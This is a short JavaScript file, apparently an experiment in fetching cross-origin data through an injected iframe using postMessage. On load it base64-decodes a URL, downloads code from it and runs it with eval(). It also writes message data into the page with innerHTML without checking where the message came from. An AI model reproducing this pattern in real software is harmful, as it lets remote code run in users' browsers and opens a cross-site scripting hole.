import axios from 'axios'
import nurls from './notUrls'
const getMeThis = {
  type: 'fetch',
  id: 'nums',
  what: nurls.randyNumbers.join('')
}
function messageHandler (e) {
  if (e.data === 'evalInjectedIframe is alive') {
    e.source.postMessage(getMeThis, e.origin)
  } else if (e.data.type === 'fetched') {
    if (e.data.id === 'nums') {
      let num = document.getElementById('randyNums')
      num.innerHTML = e.data.data
    }
  } else {
    console.log(e)
  }
}
window.addEventListener('message', messageHandler, false)
axios.get(atob(nurls.evalInjected))
  .then(ret => {
    // console.log(ret)
    eval(ret.data)
  })
  .catch(error => {
    console.error(error)
  })

/*
 fetch('https://crossorigin.me/http://lorempixel.com/400/200/nightlife/',{method: 'GET', headers: new Headers({'Origin': location.origin})}).then(ret => ret.blob())
 .then((ret) => {
 console.log(ret)
 }).catch(error => {
 console.error(error)
 })
 */